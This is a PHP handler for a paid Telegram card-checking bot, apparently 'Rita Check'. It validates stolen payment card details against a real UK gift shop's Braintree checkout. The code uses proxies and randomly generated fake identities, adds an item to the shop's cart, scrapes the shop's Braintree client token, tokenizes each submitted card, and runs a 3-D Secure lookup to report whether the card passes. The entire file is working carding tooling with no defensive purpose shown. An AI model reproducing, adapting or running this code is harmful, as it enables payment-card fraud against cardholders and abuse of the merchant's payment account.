<?php
if(strpos($message, '!vbv') === 0 or strpos($message, '/vbv') === 0 or strpos($message, '.vbv') === 0){
    sendaction($chatId, typing);
    include '/CurlX.php';
    unlink(getcwd().'/cookie.txt');
    $Mi_Id = "5168647868";
    $tiempo_inicial = microtime(true);
    deleteprm($userId);
    $lista = substr($message, 5);
    if (empty($lista)){
        reply_to($chatId, $message_id,$keyboard,'<b>Braintree 3D%0AFormat: cc|m|y|cvv</b>');
        die();
    }
    $bin = substr($lista, 0,6);
    $bines = bannedbin($bin);
        if($bines == true){
            reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
            exit();
        }

$MkGater ='B3D';
$Razonn = razon($MkGater);
$data = fecha($MkGater);

if($MkGater == Gater($MkGater)){ 
    reply_to($chatId,$message_id,$keyboard,urlencode("<b><i>Gateway $MkGater
•────────────────•
❗️ GATE IN MAINTENANCE ❗️
•────────────────•
📛 Command Inactive Since:
$data
🔰 Comment: $Razonn $Rank.</i></b>"));
    die();
}
if($userId == verifniBan($userId)){
    sendMessage($chatId,$keyboard,"<b>🚷- [Status Ban] Te Encuentra ban no puedes hacer uso de ningún comando del bot%0AID : $userId</b>.");
    die();
}
if ($userId != $Mi_Id ){
    if(False == verifiCharAdmin($chatId)){
    if( False == verifiPremium($userId)){
        if(False == verifiAdmin($userId)){
			if(False == veritimepremium($userId)){
			bot('sendMessage', [
                'chat_id' =>$chatId,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>Hello this chat is not Authorized
❄️ Buy a membership to make use of this commands
═══════════════════════
↯ Contact A Owner or a Seller</b>",
                'reply_markup'=> json_encode(['inline_keyboard'=>[
                    [['text'=>"🝂 𝗥𝗶𝘁𝗮 𝗖𝗵𝗲𝗰𝗸「𝑹𝒚𝒌」 ",'url'=>"https://t.me/+9PVHHRlmIgQ3Yzhh"]]
                    ],'resize_keyboard'=>true])
                ]);       
    die();
}}}}}

$nui = infouser($userId);
    $Rank = $nui['apodo'];
if($gId == $Mi_Id){
    $Rank = "Owner";
    $GLOBALS['Rank'] = $Rank;
}elseif($userId == verifiAdmin($userId)){
    $Rank ="Admin";
    $GLOBALS['Rank'] = $Rank;
}elseif($userId == veritimepremium($userId)){
   $Rank = $nui['apodo'];
}elseif($chatId == verifiCharAdmin($chatId)){
    $Rank = "Free User";
    $GLOBALS['Rank'] = $Rank;
}
elseif($userId == verifiUser($userId)){
    $Rank ="Free user";
    $GLOBALS['Rank'] =$Rank;
}
$lista = clean($lista);
$check = strlen($lista);
$chem = substr($lista, 0,1);
if(preg_match_all("/(\d{15,16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3,4})/", $lista, $matches)) {
    $lista = $matches[0][0]; 
$cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
$strlenn = strlen($cc);
$strlen1 = strlen($mes);
$ano1 = $ano;

$list = preg_replace(''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');
$vaut = array(1,2,7,8,9,0);
if (in_array($chem, $vaut)) { 
    reply_to($chatId, $message_id,$keyboard,'<b>Este bot solo soporta Amex, Visa, MasterCard y Discover.</b>');
    exit();
  }

$antispmatim = antispamCheck($userId);
    if($antispmatim != False ){
       reply_to($chatId,$message_id,$keyboard,"<b>[ANTI SPAM] Try again after $antispmatim</b><b>s</b>.");
        exit();
    }
$antispmatim = antispamCheckperemium($userId);
    if($antispmatim != False ){
       reply_to($chatId,$message_id,$keyboard,"<b>[ANTI SPAM] Try again after $antispmatim</b><b>s</b>.");
        exit();
    }

$ccincore = Luhn($cc);
if($ccincore == 'ERROR'){
    reply_to($chatId,$message_id,$keyboard,"<b>Incorrect Credit Card Number</b>");
    die();
}
$cc3 = substr($cc, 0,6);
$res = bininfo($cc3);
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];
if($scheme == 'PREPAID'){
    reply_to($chatId,$message_id,$keyboard,"<b>Bin PREPAID Banned</b>.");
    die();
}

$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>ϟ CHECKING YOUR CARD
[ 🝂 WAIT A FEW SECONDS 🟥 ]
Gateway » Braintree 3D
CARD » <code>$cc|$mes|$ano|$cvv</code>
CHECKED BY: <a href='tg://user?id=$userId'>$username</a> [<code>$Rank</code>]</b>"
]);
$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$rotate = rotate();
$socks5 = socks5();

$curl = new CurlX;
$cookie = uniqid();


$retries = 0;
$maxRetries = 3;
$server=null;


$json = file_get_contents("https://randomuser.me/api/?nat=us");
$data = json_decode($json, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"]) . '.' . strtolower($user["name"]["last"]) . '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];
$street = $user["location"]["street"]["name"] . ' ' . $user["location"]["street"]["number"];
$state = $user["location"]["state"];
$city = $user["location"]["city"];
$phone = $user["phone"];
$zip = $user["location"]["postcode"];

$password = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 14);

while ($retries < $maxRetries) {
    try {


        $req2 = $curl::Post('https://giftstomorrow.co.uk/?wc-ajax=add_to_cart',
        $data ='=&quantity=1&=&product_id=565&alt_s=&hvftok7814=913162',
        $headers = [
            'accept: */*',
            'accept-language: es-ES,es;q=0.9',
            'content-type: application/x-www-form-urlencoded; charset=UTF-8',
            'origin: https://giftstomorrow.co.uk',
            'priority: u=1, i',
            'referer: https://giftstomorrow.co.uk/product/iggi-key-ring-bottle-opener-stainless-steel/',
            'sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'x-requested-with: XMLHttpRequest',
        ],
        $cookie, $server);

    if (!$req2->code) {
        throw new Exception("Error en la conexión REQ1");
    }

    $req1 = $curl::Get("https://giftstomorrow.co.uk/checkout/", $headers = 
    ['authority: giftstomorrow.co.uk',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'referer: https://giftstomorrow.co.uk/product/iggi-key-ring-bottle-opener-stainless-steel/',
    'upgrade-insecure-requests: 1',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'], $cookie, $server);
    if (!$req1->code) {
        throw new Exception("Error en la conexión REQ2");
    }
    $wc_braintree_client_token = $curl::ParseString($req1->body, 'var wc_braintree_client_token = ["', '"');
    $bearer = json_decode(base64_decode($wc_braintree_client_token), true)["authorizationFingerprint"];

    if (!$bearer) {
        throw new Exception("Error en bearer");
    }
    $uuid = vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex(random_bytes(16)), 4)); $uuid[14] = '4'; $uuid[19] = dechex(hexdec($uuid[19]) & 0x3 | 0x8);

    $req2 = $curl::Post('https://payments.braintree-api.com/graphql',
        $data ='{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.$uuid.'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"EH16 5PA","streetAddress":"5 Lady Rd"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
        $headers  = [
            'authority: payments.braintree-api.com',
            'accept: */*',
            'authorization: Bearer '.$bearer.'',
            'braintree-version: 2018-05-10',
            'content-type: application/json',
            'origin: https://assets.braintreegateway.com',
            'referer: https://assets.braintreegateway.com/',
            'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
       ],
        $cookie, null);
        if (!$req2->code) {
        throw new Exception("Error en la conexión REQ3");
    }
    $token = json_decode($req2->body, true)['data']['tokenizeCreditCard']['token'];
    if (!$token) {
        throw new Exception("Error en bearer");
    }

    $req2 = $curl::Post('https://api.braintreegateway.com/merchants/ttn638rpstnkt23b/client_api/v1/payment_methods/'.$token.'/three_d_secure/lookup',
        $data ='{"amount":"5.88","browserColorDepth":24,"browserJavaEnabled":false,"browserJavascriptEnabled":true,"browserLanguage":"es-ES","browserScreenHeight":768,"browserScreenWidth":1366,"browserTimeZone":300,"deviceChannel":"Browser","additionalInfo":{"shippingGivenName":"'.$firstname.'","shippingSurname":"'.$lastname.'","billingLine1":"5 Lady Rd","billingLine2":"","billingCity":"Edinburgh","billingState":"","billingPostalCode":"EH16 5PA","billingCountryCode":"GB","billingPhoneNumber":"0131 667 6588","billingGivenName":"'.$firstname.'","billingSurname":"'.$lastname.'","shippingLine1":"5 Lady Rd","shippingLine2":"","shippingCity":"Edinburgh","shippingState":"","shippingPostalCode":"EH16 5PA","shippingCountryCode":"GB","email":"'.$email.'"},"bin":"'.substr($cc, 0,6).'","dfReferenceId":"0_dae63dbd-1418-47e8-8188-de3dca30ead3","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.102.0","cardinalDeviceDataCollectionTimeElapsed":9,"issuerDeviceDataCollectionTimeElapsed":4258,"issuerDeviceDataCollectionResult":true},"authorizationFingerprint":"'.$bearer.'","braintreeLibraryVersion":"braintree/web/3.102.0","_meta":{"merchantAppId":"giftstomorrow.co.uk","platform":"web","sdkVersion":"3.102.0","source":"client","integration":"custom","integrationType":"custom","sessionId":"'.$uuid.'"}}',
        $headers = [
            'authority: api.braintreegateway.com',
            'accept: */*',
            'content-type: application/json',
            'origin: https://giftstomorrow.co.uk',
            'referer: https://giftstomorrow.co.uk/checkout/',
            'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
       ],
        $cookie, null);
        if (!$req2->code) {
        throw new Exception("Error en la conexión REQ4");
    }
        break; 

    } catch (Exception $e) {
        $retries++;
        if ($retries >= $maxRetries) {
            $text = Textretries();
            bot('editMessageText', ['chat_id'=>$chatId, 'message_id'=>$messageidtoedit, 'text'=>$text, 'parse_mode'=>'html', 'reply_to_message_id'=> $message_id]);
            return;
        }
    }
}

$enrolled = json_decode($req2->body, true)['paymentMethod']['threeDSecureInfo']['status'];


$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);
edit_message($chatId,$message_id_1,$keyboard,urlencode("<b>ϟ CHECKING YOUR CARD
[ ALMOST FINISHED 🟩 ]
Gateway » Braintree 3D
CARD » <code>$cc|$mes|$ano|$cvv</code>
CHECKED BY: <a href='tg://user?id=$userId'>$username</a> [<code>$Rank</code>]</b>"));


if (strpos($req2->body, 'authenticate_successful') || strpos($req2->body, 'authenticate_attempt_successful')){
$status = "Free 3D✅";
$response = $enrolled;
}else{
$status = "False❌";
$response = $enrolled;
}


bot('editMessageText',[
    'chat_id'=>$chatId,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>Card - 🝂 <code>$cc|$mes|$ano|$cvv</code> 
Status - 🝂 $status
Response - 🝂 $response 
Gateway - 🝂 Braintree 3D
──────────────────────
Bin - 🝂 <code>$brand</code> - <code>$scheme</code> - <code>$type</code> 
Bank - 🝂 <code>$bank </code> 
Country - 🝂 <code>$country </code>$emoji 
──────────────────────
Time in Progress - 🝂 $tiempo s
@RitaaChk_Bot
Checked by: <a href='tg://user?id=$userId'>$username</a>[$Rank]</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);

curl_close($ch);
ob_flush();
}
}
?>

